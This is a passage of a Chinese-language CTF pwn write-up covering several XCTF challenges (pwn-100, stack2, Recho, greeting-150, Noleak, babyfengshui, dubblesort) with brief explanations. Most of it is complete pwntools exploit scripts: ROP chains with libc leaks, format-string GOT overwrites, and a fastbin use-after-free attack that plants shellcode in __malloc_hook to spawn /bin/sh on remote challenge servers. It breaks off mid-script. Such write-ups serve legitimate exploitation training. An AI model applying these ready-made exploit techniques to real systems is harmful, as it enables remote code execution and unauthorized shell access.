offset = 12
log.success('offset: %d', offset)

writes = { 0x0804a048: 0x02223322}
payload = fmtstr_payload(offset, writes)
log.success("payload: %s", payload)

sh = remote('220.249.52.133', 57893)
sh.sendline(payload)
sleep(1)
sh.interactive()
```

### 14. pwn-100
题目：无

思路：64位栈溢出，常规rop方法即可，本题使用了万能rop，没有提供libc需要先泄露libc地址。

代码如下：
```python
from pwn import *
from LibcSearcher import *

sh = remote('220.249.52.133', 52332)
elf = ELF('bee9f73f50d2487e911da791273ae5a3')

ppppppr = 0x40075A
mmmcall = 0x400740

# 利用万能gadget封装一个函数指针调用功能
def makePayload(funcAddr, arg0, arg1, arg2):
    # 这一段在echo函数中会被复制到缓冲区中导致栈溢出
    # 后续因为有0字符不会被复制
    payload = b'A' * 64
    payload += b'B' * 8
    ret = ppppppr
    payload += p64(ret)
    rbx = 0
    rbp = 1
    r12 = funcAddr
    r13 = arg2
    r14 = arg1
    r15 = arg0
    ret = mmmcall
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(ret)
    # mmmcall指令执行完后，还会继续执行到add rsp,8和ppppppr指令
    # 因此首先安排56字节填充内容，然后在放置新的返回地址，这里使用main函数
    ret = 0x4006B8
    payload += b'C' * 56
    payload += p64(ret)
    return payload

# 使用DynELF报错，提示找不到DT_PLTGOT???
# def _leak(addr):
#     payload = makePayload(elf.got['puts'], addr, 1, 1)
#     sh.send(payload.ljust(200, b'a'))
#     data = sh.recvuntil('\n')
#     data = sh.recvuntil('\n').strip() + b'\x00\x00'
#     return data[:1]
# 
# def leak(addr):
#     res = b''
#     for i in range(8):
#         res += _leak(addr + i)
#     print(addr, res)
#     return res
# 
# d = DynELF(leak, elf=elf)
# system = d.lookup('system', 'libc')
# log.info('system: 0x%x', system)


# 使用libcsearcher查找到多个结果，逐个测试就可以了
payload = makePayload(elf.got['puts'], elf.got['puts'], 1, 1)
sh.send(payload.ljust(200, b'a'))
data = sh.recvuntil('\n')
data = sh.recvuntil('\n').strip() + b'\x00\x00'
putsAddr = u64(data)
log.success('puts.got: 0x%x' % putsAddr)

payload = makePayload(elf.got['puts'], elf.got['read'], 1, 1)
sh.send(payload.ljust(200, b'a'))
data = sh.recvuntil('\n')
data = sh.recvuntil('\n').strip() + b'\x00\x00'
readAddr = u64(data)
log.success('read.got: 0x%x' % readAddr)

libc = LibcSearcher('puts', putsAddr)
libc.add_condition('read', readAddr)

libBase = putsAddr - libc.dump('puts')
systemAddr = libBase + libc.dump('system')
binStrAddr = libBase + libc.dump('str_bin_sh')
log.success('libBase: 0x%x' % libBase)
log.success('systemAddr: 0x%x' % systemAddr)
log.success('binStrAddr: 0x%x' % binStrAddr)

bss = elf.bss() + 100
payload = makePayload(elf.got['read'], 0, bss, 16)
sh.send(payload.ljust(200, b'a'))
sleep(1)
data = sh.recvuntil('\n')
sh.send(b'/bin/sh\x00'+p64(systemAddr))
sleep(1)
payload = makePayload(bss + 8, bss, 1, 1)
sh.send(payload.ljust(200, b'a'))
data = sh.recvuntil('\n')
sh.interactive()
```

### 15. stack2
题目：暂无

思路：漏洞点在于数组越界，导致可以写任意地址。

存在两个坑，一个是在覆盖main函数的返回地址时没有注意，直接使用常规栈帧计算，一直没有效果，查看wp发现返回地址不是在ebp之下，而是存在一段距离，仔细查看了汇编代码才发现在push ebp之前还有几条指令。
```asm
.text:080485D0                 lea     ecx, [esp+4]
.text:080485D4                 and     esp, 0FFFFFFF0h
.text:080485D7                 push    dword ptr [ecx-4]
.text:080485DA                 push    ebp
.text:080485DB                 mov     ebp, esp
```
将esp按16字节对齐，因此栈顶会抬高一段距离，具体通过调试可以知道。此后还需要将对齐之前的栈顶压栈，用于恢复。

第二个坑在于返回到hack函数的时候提示没有/bin/bash这个命令。有两个解决办法，第一个是通过```ROPgadget --binary  3fb1a42837be485aae7d85d11fbc457b --string "sh"```查找sh字符串，然后将返回地址和参数覆盖为system.plt和sh的地址，如果不行的话可以通过rop的方式，利用scanf函数手动写入/bin/sh字符串到bss段，然后继续rop调用system("/bin/sh")。

全部代码如下：
```python
from pwn import *

sh = remote("220.249.52.133", 34088)

sh.recvuntil(":\n")
sh.sendline("1")
sh.sendline("1")

def writeByte(index, data):
    sh.recvuntil("exit\n")
    sh.sendline("3")
    sh.sendlineafter(":\n", "%d" % index)
    sh.sendlineafter(":\n", "%d" % data)

systemAddr = 0x08048450
shAddr = 0x08048987
payload = p32(systemAddr) + b'AAAA' + p32(shAddr)
index = 132
print(payload)
for i in payload:
    writeByte(index, i)
    index += 1

data = sh.sendlineafter("exit\n", "5")
print(data)
sh.interactive()
```

### 16. Recho
题目：暂无

思路：看起来是一个很简单的栈溢出，但是难点在于如何使得main函数返回，从而劫持控制流。这里使用了pwntools提供的shutdown功能，可以关闭输入流，但是由于无法继续输入了，因此必须通过rop一次获取flag，而不能继续进入main函数输入其他信息了。

由于只能关闭输入流才能劫持控制流，因此本题不能使用getshell的方式，而是使用了读文件的方式获取flag，并且本题正好提供了一个flag字符串，用于执行open函数。因此最终我们需要构造如下功能的shellcode：
```c
int fd = open("flag", READONLY);
read(fd, buf, 100);
printf(buf);
```
由于本程序已经导入了alarm，read，write，现在还缺少open函数。修改alarm函数got表的内容将其指向alarm函数中调用syscall的部分，然后通过rop控制syscall的相关参数即可手动实现open函数。查看下alarm函数的ida反汇编代码如下：
```c
.text:00000000000C0AC0 alarm           proc near               ; CODE XREF: lckpwdf+1AC↓p
.text:00000000000C0AC0                                         ; lckpwdf+1F3↓p ...
.text:00000000000C0AC0 ; __unwind {
.text:00000000000C0AC0                 mov     eax, 25h ; '%'
.text:00000000000C0AC5                 syscall                 ; LINUX - sys_alarm
.text:00000000000C0AC7                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:00000000000C0ACD                 jnb     short loc_C0AD0
.text:00000000000C0ACF                 retn
```
默认alarm的got表中保存的地址应该是libc基址+00000000000C0AC0，如果将这个地址往后偏移5个字节即可实现手动调用syscall了。不同libc版本偏移不一定都为5个字节，某些版本可能是7个字节或其他。要实现这个功能需要一个包含add指令的Gadget，使用ROPGadget搜索add|ret指令可以得到。
```c
0x000000000040070d : add byte ptr [rdi], al ; ret
```
只要设置al为5，rdi为alarm.got即可实现将alarm.got所指向的内容增加5个字节的偏移。现在梳理下rop调用链：

1. 设置rdi为alarm.got
pop rdi; ret
2. 设置al为5
pop rax; ret
3. 修改got表
add [rdi], al; ret
4. 设置open的两个参数
pop rdi; ret
pop rsi; ret
5. 设置eax为open函数的系统调用号
pop rax; ret
6. 设置read函数的3个参数
pop rdi; ret
pop rsi; ret // 没有这个Gadget，可以用pop rsi; pop r15; ret代替
pop rdx; ret
7. 设置printf函数的参数
pop rdi; ret

最终所需要的Gadget为
```python
0x00000000004006fc : pop rax ; ret
0x00000000004008a3 : pop rdi ; ret
0x00000000004006fe : pop rdx ; ret
0x00000000004008a1 : pop rsi ; pop r15 ; ret
0x000000000040070d : add byte ptr [rdi], al ; ret

pop_rax = 0x4006fc
pop_rdi = 0x4008a3
pop_rdx = 0x4006fe
pop_rsi_r15 = 0x4008a1
add_rdi = 0x40070d
```

全部利用代码如下
```python
from pwn import *

elf = ELF('773a2d87b17749b595ffb937b4d29936')
sh = remote('220.249.52.133', 46624)

data = sh.recvuntil('\n')
log.info(data)

# 覆盖缓冲区
payload = b'A' * 0x38

# gadget地址
pop_rax = 0x4006fc
pop_rdi = 0x4008a3
pop_rdx = 0x4006fe
pop_rsi_r15 = 0x4008a1
add_rdi = 0x40070d

# rop开始
# 1. 修改got表
payload += p64(pop_rdi) + p64(elf.got['alarm']) + p64(pop_rax) +  p64(5) + p64(add_rdi)
# 2. open("flag", READONLY)
# open的系统调用号为2
# 这里最后虽然调用的是alarm函数，但是实际会跳转至syscall
payload += p64(pop_rdi) + p64(next(elf.search(b'flag'))) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(pop_rax) + p64(2) +  p64(elf.plt['alarm'])
# 3. read(3, buf, 100)
# open打开文件默认从3开始
# buf使用bss段数据
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(elf.bss() + 100) + p64(0) + p64(pop_rdx) + p64(100) + p64(elf.plt['read'])
# 4. printf(buf)
payload += p64(pop_rdi) + p64(elf.bss() + 100) + p64(elf.plt['printf'])

print(payload)
sh.sendline(str(0x200))
sh.send(payload.ljust(0x200, b'\x00'))
sh.shutdown('write')
sh.interactive()
```

### 17. greeting-150
题目：暂无

思路：格式化字符串漏洞，可以修改got表，这里的关键在于修改_do_global_dtors_aux函数的got表，使得main函数结束后可以劫持流程。

#### __do_global_dtors_aux和__do_global_ctors_aux
静态对象的构造函数和析构函数的地址分别存储在 ELF可执行文件的不同部分中。对于构造函数，有一个名为 .CTORS 的部分，对于析构函数，有 .DTORS 部分。编译器创建两个辅助函数 __ do_global_ctors_aux 和 __ do_global_dtors_aux ，分别用于调用这些静态对象的构造函数和析构函数。__ do_global_ctors_aux 功能只是在 .CTORS 部分执行，而 __ do_global_dtors_aux 仅针对执行相同的工作。 DTORS 部分，其中包含指定析构函数的程序。

#### 修改got
修改__do_global_dtors_aux的got内容为main函数地址使得main函数结束后还可以再次重入到main函数，然后修改strlen函数的got表内容为system函数地址，然后调用strlen("/bin/sh")时就获取了shell。
```python
.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o
.fini_array:08049934 _fini_array     ends                    ; Alternative name is '__init_array_end'
# 0x08049934的内容从080485A0 __do_global_dtors_aux proc near修改为080485ED ; int __cdecl main
# 可以看到只用修改一个字节即可
```

修改strlen的got地址内容为system地址，system地址不便于获取，可以用system的plt地址代替。

全部利用代码如下：
```python
from pwn import *

sh = remote('220.249.52.133', 55994)
data = sh.recvuntil('... ')
print(data)

# 借助ida可以分析调用printf堆栈情况
# 0xA0 --> s
# ...
# 0x84 --> 'Nice'
# 0x80 --> ' to '
# 0x7c --> 'meet'
# 0x78 --> ' you'
# 0x74 --> ', '
# 首先添加两个字符使栈内容按照4字节对齐
payload = b'AA'
# 修改dtor got地址，需要写入的地址, 第12个参数
# 修改前后只有最后一个字节不同，因此只用写入一个字节
payload += p32(0x08049934)
# 由于之前已经输出了24个字符，还需要输出0xed-24个字符
payload += b'%213'
payload += b'c%12'
payload += b'$hhn'
# 没有system函数的地址，但是可以使用plt的地址
strlenGot = 0x08049A54
# systemPlt = 0x08048490
# 分两次写入
# 修改strlen got地址, 先写高地址，第16个参数
payload += p32(strlenGot + 2)
payload += b'%181'
payload += b'1c%1'
payload += b'6$hn'
# 写低地址, 第20个参数
payload += p32(strlenGot)
payload += b'%318'
payload += b'80c%'
payload += b'20$h'
payload += b'n'
print(payload)
print(len(payload))

# 上面生成payload的方式计算比较复杂
# 可以将地址写在前面，方便计算
# 按照数字从小到大的顺序写入
payload = b'AA'
payload += flat([0x08049934, strlenGot + 2, strlenGot])
chars = [0xed - 32, 0x804 - 0xed, 0x8490 - 0x804]
payload += ('%' + str(chars[0]) + 'c%12$hhn%' + str(chars[1]) + 'c%13$hn%' + str(chars[2]) + 'c%14$hn').encode('utf8')
print(payload)
sh.sendline(payload)

data = sh.recvuntil('... ')
sh.sendline('/bin/sh')
sh.interactive()
```

### 17. secret_file
题目：暂无

思路：程序逻辑是对输入的数据计算sha256，然后比较这个值是否等于某个特定的值，如果等于则可以执行一个特定的命令。漏洞点在于未检查输入数据长度，导致可以覆盖到目标散列值和命令字符串，这样只要根据一个已知字符串及其散列值，就可以任意构造命令获取flag。

### 18. Noleak
题目：暂无

思路：漏洞点主要有两个，一是free后指针未置空，存在UAF，二是修改数据时没有检查数据长度存在堆溢出。由于开启了Full RELRO保护、未开启NX，因此不能修改got表，而是使用的是修改__malloc_hook地址，将其指向shellcode，当再次执行malloc时获得flag。

chunk数据结构
```c++
// chunk数据结构
struct malloc_chunk {
    int mchunk_prev_size;    // 前一个堆为空闲时记录前一个堆的大小，不空闲时为前一个堆的数据部分
                             // 这个字段实际属于前一个堆结构数据部分！
    int mchunk_size;         // 堆块的大小（包括数据和堆头，不包含前一个字段）
                             // 这个字段的后三个bit用于标志位，计算大小时忽略
                             // 最后一个bit记录前一个块是否被分配
    struct malloc_chunk* fd; // 前一个空闲堆块，free状态有用
    struct malloc_chunk* bk; // 后一个空闲堆块，free状态有用
}
```
#### 修改glibc版本调试堆
```python
# 先下载对应版本libc
cd glibc-all-in-one
/download 2.23-0ubuntu11.2_amd64
# 然后修改二进制程序的libc库
ldd timu
        linux-vdso.so.1 (0x00007ffcb71d7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa64a3eb000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa64a5c9000)
patchelf --set-interpreter ./libs/2.23-0ubuntu11.2_amd64/ld-2.23.so  timu
patchelf --set-rpath ./libs/2.23-0ubuntu11.2_amd64/ timu
ldd timu
        linux-vdso.so.1 (0x00007ffd5b7db000)
        libc.so.6 => ./libs/2.23-0ubuntu11.2_amd64/libc.so.6 (0x00007f3930b33000)
        ./libs/2.23-0ubuntu11.2_amd64/ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007f3930eff000)
```

#### fastbin攻击
当释放堆的大小（包含头部）在fastbin大小范围内（64位fastbin的大小为0x20-0x80)时，会进入fastbin链表，通过fd形成单链表，增加和移除节点都在链头进行操作。当存在uaf漏洞时，可以修改fd字段从而改变链表。
```python
# fastbin攻击的目的是通过uaf伪造一个fastbin链表项，然后malloc得到改链表项，实现任意地址写入
# 这里存在两个问题：
# 一是确定需要写入的地址，由于本题无法修改got，只能修改__malloc_hook函数指针
# 但是由于无法直接确定该指针的地址，在unsortedbin chunk中包含这个地址相邻的地址
# 进一步可以通过fastbin攻击将unsortedbin chunk链如fastbin链表中获取到这个地址
# 获取到的unsortedbin地址在buf中，并且这个地址和__malloc_hook最后一个字节不同
# 需要能够写入buf修改这个字节，因此确定需要写入的地址为buf，或者buf之前的地址
# 二是伪造的fastbin链表项的大小应该满足fastbin的大小，在内存中查找buf之前的地址x
# 使得x指向的8个字节整数小于等于0x7f
# buf的地址为601040，data段起始地址为601000，实际上可以在data再往前16个字节开始搜索（再往前就是got表了，但是got表是不可写的）
pwndbg> x/40b 0x600ff0
0x600ff0:       0x90    0xce    0x7e    0x14    0x96    0x7f    0x00    0x00
0x600ff8:       0x40    0x00    0x7f    0x14    0x96    0x7f    0x00    0x00
0x601000:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x601008:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x601010:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
# 可以看到600ffd处的数值为0x000000000000007f，满足fastbin大小
# 因此伪造的链表地址为0x600ff5,堆大小为0x70，数据大小为0x68
add(0x68,'0')
add(0x68,'1')
add(0x68,'2')
dele(1)
dele(0)
# 释放两个节点后，fastbins中多出了一个单链表
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x113a000
Size: 0x71
fd: 0x113a070

Free chunk (fastbins) | PREV_INUSE
Addr: 0x113a070
Size: 0x71
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x113a0e0
Size: 0x71

Top chunk | PREV_INUSE
Addr: 0x113a150
Size: 0x20eb1

pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x113a000 —▸ 0x113a070 ◂— 0x0
0x80: 0x0

# 由于存在uaf，可以继续编辑第一个chunk，从而修改fd字段，进而破坏单链表
edit(0,8,p64(0x600ff5))
# 修改后的堆如下
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x113a000
Size: 0x71
fd: 0x600ff5

Allocated chunk | PREV_INUSE
Addr: 0x113a070
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x113a0e0
Size: 0x71

Top chunk | PREV_INUSE
Addr: 0x113a150
Size: 0x20eb1

pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x113a000 —▸ 0x600ff5 ◂— 0

# 再连续创建两个节点就会从伪造的单链表中取出chunk，节点3正常，而节点4则指向伪造的0x600ff5+0x10处
# 节点4在buf前面某个地方，这样通过在节点4中写入数据实际上就可以控制buf的内容了
add(0x68,'3')
add(0x68,'4')
# 堆结构和buf缓存如下
pwndbg> x/20x 0x601040
0x601040:       0x0113a010      0x00000000      0x0113a080      0x00000000
0x601050:       0x0113a0f0      0x00000000      0x0113a010      0x00000000
0x601060:       0x00601005      0x00000000      0x00000000      0x00000000
0x601070:       0x00000000      0x00000000      0x00000000      0x00000000
0x601080:       0x00000000      0x00000000      0x00000000      0x00000000
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x113a000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x113a070
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x113a0e0
Size: 0x71

Top chunk | PREV_INUSE
Addr: 0x113a150
Size: 0x20eb1

# 下面利用节点4将buf中节点4之前的指针全部清空
payload='\00'*0x5b
edit(4,len(payload),payload)
# 执行完之后buf的内容如下
pwndbg> x/20x 0x601040
0x601040:       0x00000000      0x00000000      0x00000000      0x00000000
0x601050:       0x00000000      0x00000000      0x00000000      0x00000000
0x601060:       0x00601005      0x00000000      0x00000000      0x00000000
0x601070:       0x00000000      0x00000000      0x00000000      0x00000000
0x601080:       0x00000000      0x00000000      0x00000000      0x00000000

# 由于buf前4项为空，因此可以继续创建节点，再创建4个节点
# 其中节点2的大小超出了fastbin
add(0x68,'0')
add(0x68,'1')
add(0x80,'2')
add(0x68,'3')

# 再依次删除3，0，2节点，其中3，0进入fastbin形成单链表，2进入unsortedbin形成双链表
# 并且unsortedbin chunk默认指向main_arena+88处
dele(3)
dele(0)
dele(2)
# 此时堆分布如下
Free chunk (fastbins) | PREV_INUSE
Addr: 0x113a150
Size: 0x71
fd: 0x113a2c0

Allocated chunk | PREV_INUSE
Addr: 0x113a1c0
Size: 0x71

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x113a230
Size: 0x91
fd: 0x7fcb68da7b78
bk: 0x7fcb68da7b78

Free chunk (fastbins)
Addr: 0x113a2c0
Size: 0x70
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x113a330
Size: 0x20cd1

pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x113a150 —▸ 0x113a2c0 ◂— 0x0
0x80: 0x0
pwndbg> unsortedbin 
unsortedbin
all: 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */

# 再次通过uaf漏洞修改fastbins单链表，将0x113a150的fd指针的第一个字节（低字节）修改为30
edit(0,1,'\x30')
# 这时单链表的第一个节点的fd指针实际指向节点2的堆块
# 再创建3个对应大小的节点就可以从得到main_arena+88附近的指针了
# 这里我们需要修改的是__malloc_hook，对应地址为0x7fcb68da7b10
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x113a150 —▸ 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
0x80: 0x0
pwndbg> unsortedbin 
unsortedbin
all: 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
# 由于libc在加载到内存时最后一个字节始终是固定的，因此我们只要能够将__malloc_hook的前七个字节写入到buf
# 然后通过节点4操作buf的能力将第0x10（__malloc_hook第8字节）写入到buf中就可以得到__malloc_hook的准确地址了
# 这里存在一个问题，能够直接创建3个对应大小的节点么？
# 实际上是不行的，由于fastbin还有一个检查机制，如果链表中的堆块大小异常会报错
# 即伪造的fastbin chunk，也就是0x7fcb68da7b78+8(对应chunk的size字段)是否为0x70-0x7f之间（如果是其他fastbin大小以此类推），检查main_arena+88明显不满足
# 通过查看0x7fcb68da7b00之后的内存可以找到一个满足的地址，0x7fcb68da7b05
# 0x7fcb68da7b05+8 => 0x7f    0x00    0x00    0x00    0x00    0x00    0x00    0x00
pwndbg> x/40b 0x7fcb68da7b00
0x7fcb68da7b00 <__memalign_hook>:       0xa0    0x8e    0xa6    0x68    0xcb    0x7f    0x00    0x00
0x7fcb68da7b08 <__realloc_hook>:        0x70    0x8a    0xa6    0x68    0xcb    0x7f    0x00    0x00
0x7fcb68da7b10 <__malloc_hook>:         0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fcb68da7b18:                         0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fcb68da7b20 <main_arena>:            0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

# 利用uaf漏洞编辑节点2，可以修改节点2的fd字段的第一个字节
edit(2,1,'\x05')
# 此时堆内存如下，这时候伪造的chunk 0x7fcb68da7b05的大小就能够绕过fastbin检查机制了
pwndbg> x/10x 0x7fcb68da7b0d
0x7fcb68da7b0d <__realloc_hook+5>:      0x0000007f      0x00000000      0x00000000      0x00000000
0x7fcb68da7b1d: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fcb68da7b2d <main_arena+13>: 0x00000000      0x00000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x113a150 —▸ 0x113a230 —▸ 0x7fcb68da7b05 (__memalign_hook+5) ◂— 0
0x80: 0x0
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x113a230 —▸ 0x7fcb68da7b05 (__memalign_hook+5) ◂— 0
BK: 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
# 为了绕过fastbin的检查机制，还需要修改伪造的fastbin chunk 0x113a230的size字段为0x71(最后一位为标志位)
# 为了修改chunk 0x113a230（改chunk的上一个chunk为节点1对应的chunk）
# 需要利用节点1的堆溢出漏洞，覆盖该chunk头部的size字段
payload='\x00'*0x68+'\x71'
edit(1,len(payload),payload)

# 再连续创建三个节点即可将0x7fcb68da7b05+0x10写入buf[7]
add(0x68,'5')
add(0x68,'6')
add(0x68,'7')

# 此时buf[4]中保存的还是0x00601005，通过修改节点4可以写入shellcode，同时修改buf[7]的第一个字节为0x10
# buf[7]第一个字节的地址为0x00601078，因此共需要写入0x73字节
shellcode=asm(shellcraft.sh()).ljust(0x73,'\x00')+'\x10'
edit(4,len(shellcode),shellcode)

# 最后将shellcode的首地址写入__malloc_hook所指向的内存中，再调用一次malloc即可执行shellcode
edit(7,8,p64(0x601005))
io.sendline('1')
io.sendline('1')
io.interactive()
```

xctf-wp全部源代码如下：
```python
from pwn import *

debug=0

context.log_level='debug'
context.arch='amd64'
shellcode=asm(shellcraft.sh()).ljust(0x73,'\x00')+'\x10'
if debug:
    io=process('./timu')
else:
    io=remote('111.198.29.45',46917)

def add(size,data):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Data: ")
    io.sendline(data)
def dele(index):
    io.recvuntil("Your choice :")
    io.sendline("2")
    io.recvuntil("Index: ")
    io.sendline(str(index))
def edit(index,size,data):
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Data: ")
    io.sendline(data)
if __name__== "__main__":
    add(0x68,'0')
    add(0x68,'1')
    add(0x68,'2')
    dele(1)
    dele(0)
    edit(0,8,p64(0x600ff5))
    add(0x68,'3')
    add(0x68,'4')
    #gdb.attach(io)
    #pause()
    payload='\00'*0x5b
    edit(4,len(payload),payload)
    #gdb.attach(io)
    #pause()

    add(0x68,'0')
    add(0x68,'1')
    add(0x80,'2')
    add(0x68,'3')
    #gdb.attach(io)
    #pause()    
    dele(3)
    dele(0)
    dele(2)
    edit(0,1,'\x30')
    edit(2,1,'\x05')
    payload='\x00'*0x68+'\x71'
    edit(1,len(payload),payload)
    #gdb.attach(io)
    #pause()    
    add(0x68,'5')
    add(0x68,'6')
    add(0x68,'7')
    edit(4,len(shellcode),shellcode)
    edit(7,8,p64(0x601005))
    #gdb.attach(io)
    #pause()    
    #edit(2,)
    io.sendline('1')
    io.sendline('1')
    io.interactive()
```

优化后的源代码如下：
```python
from pwn import *

debug=0

context.log_level='debug'
context.arch='amd64'
if debug:
    io=process('./timu')
else:
    io=remote('220.249.52.134', 31850)

def add(size,data):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Data: ")
    io.sendline(data)
def dele(index):
    io.recvuntil("Your choice :")
    io.sendline("2")
    io.recvuntil("Index: ")
    io.sendline(str(index))
def edit(index,size,data):
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Data: ")
    io.sendline(data)
if __name__== "__main__":
    add(0x68,'0')
    dele(0)
    edit(0,8,p64(0x600ff5))
    # same with node 0
    add(0x68,'1')
    add(0x68,'2')
    # delete chunk 0(1)
    dele(0)
    # buf[8] = 0x601000
    payload='\00'*0x7b + p64(0x601000)
    edit(2,len(payload),payload)
    # gdb.attach(io)
    # pause()

    add(0x68,'0')
    add(0x68,'1')
    add(0x80,'2')
    # prevent merge
    add(0x68,'3')
    # gdb.attach(io)
    # pause()
    # fastbin link chunk0 -> chunk1
    dele(1)
    dele(0)
    # unsortedbin chunk2
    dele(2)
    # gdb.attach(io)
    # pause()
    # make fastbin link chunk0 -> chunk2 -> chunk(main_arena+88)
    edit(0,1,'\xe0')
    # gdb.attach(io)
    # pause()
    # make fastbin link chunk0 -> chunk2 -> chunk(__memalign_hook+5)
    # ensure fake chunk size 0x7f
    edit(2,1,'\x05')
    # gdb.attach(io)
    # pause()    
    # overflow chunk1 to set chunk2 size 0x71
    payload='\x00'*0x68+'\x71'
    edit(1,len(payload),payload)
    # gdb.attach(io)
    # pause()
    add(0x68,'4')
    add(0x68,'5')
    # buf[6] ==  __memalign_hook+5+0x10(chunk head)
    add(0x68,'6')
    # write shellcode to buf[8] 0x601000
    # the last 0x10 make buf[6] = __malloc_hook
    shellcode=asm(shellcraft.sh()).ljust(0x70,'\x00')+'\x10'
    edit(8,len(shellcode),shellcode)
    # set *buf[6] = *__malloc_hook = &shellcode
    edit(6,8,p64(0x601000))
    # gdb.attach(io)
    # pause()
    io.sendline('1')
    io.sendline('1')
    io.interactive()
```


### 19. babyfengshui
题目：暂无

思路：简单的堆溢出，通过堆溢出修改got表获取flag。

主要存在的坑还是计算libc基址，直接使用libc.so计算出来的system地址无法使用，最后还是使用LibcSearcher可以计算出正确的system地址。全部源代码如下：
```python
from pwn import *
from LibcSearcher import *

elf = ELF('babyfengshui')
libc = ELF('libc.so.6')

debug = False
if debug:
    io = process('babyfengshui')
else:
    io = remote('220.249.52.134', 37716)

def add(name, size):
    io.sendlineafter('Action: ', '0')
    io.sendlineafter(': ', '%d' % size)
    io.sendlineafter(': ', name)
    io.sendlineafter(': ', '2')
    io.sendlineafter(': ', 'a')

def delete(index):
    io.sendlineafter('Action: ', '1')
    io.sendlineafter(': ', '%d' % index)

def display(index):
    io.sendlineafter('Action: ', '2')
    io.sendlineafter(': ', '%d' % index)
    data = io.recvuntil('0: ')
    return data

def update(index, desc):
    io.sendlineafter('Action: ', '3')
    io.sendlineafter(': ', '%d' % index)
    io.sendlineafter(': ', '%d' % len(desc))
    io.send(desc)

if __name__ == '__main__':
    # chunk0:0x88, chunk1:0x88, chunk2:0x88, chunk3:0x88
    add('0', 0x80)
    add('1', 0x80)

    # chunk0 and chunk1 merge to chunk01:0x110
    delete(0)

    # desc: chunk01, user2: chunk4
    add('2', 0x10c)

    # /bin/sh
    add('3', 0x10)
    update(3, '/bin/sh\n')

    # write user2->desc overflow to user1->desc to free got
    desc = b'A' * (0x10c + 0x88 + 4) + p32(elf.got['free'])
    update(2, desc)

    # display user1 to leak free addr
    data = display(1)
    freeAddr = u32(data.split(b'description: ')[1][:4])
    log.success('free address: 0x%0x' % freeAddr)

    # calc system addr
    libcbase = freeAddr - libc.sym['free']
    systemAddr = libcbase + libc.sym['system']
    log.success('system address: 0x%0x' % systemAddr)

    # libc searcher
    libc = LibcSearcher('free', freeAddr)
    libcbase = freeAddr - libc.dump('free')
    systemAddr = libcbase + libc.dump('system')
    log.success('system address: 0x%0x' % systemAddr)

    # write user1->desc(free got) to system addr
    desc = p32(systemAddr)
    update(1, desc)

    # system('/bin/sh')
    delete(3)
    io.interactive()
```


### 20. dubblesort
题目：暂无

思路：主要漏洞点有两处，一是read读取字符串前未进行初始化且未加0进行截断，二是没有检查输入数组大小。

#### scanf的一个特性
```c
scanf("%u", &a);
scanf("%x", &b);
scanf("%d", &c);
```
如果只输入一个符号，scanf会跳过对变量的输入。

#### 存在的几个坑
1. 调试的时候使用的glibc-all-in-one,但是实际发现和题目给的libc还是有区别的，因此调试前只用patchelf修改了ld.so,然后通过```io = process('./dubblesort', env={"LD_PRELOAD" : "./libc_32.so.6"})```指定libc文件。
2. ida分析的栈结构可能不准确，需要实际调试，确定精确的栈结构和需要覆盖的偏移量。

全部源代码如下：
```python
from pwn import *
from LibcSearcher import *

elf = ELF('dubblesort')
libc = ELF('libc_32.so.6')

debug = False
if debug:
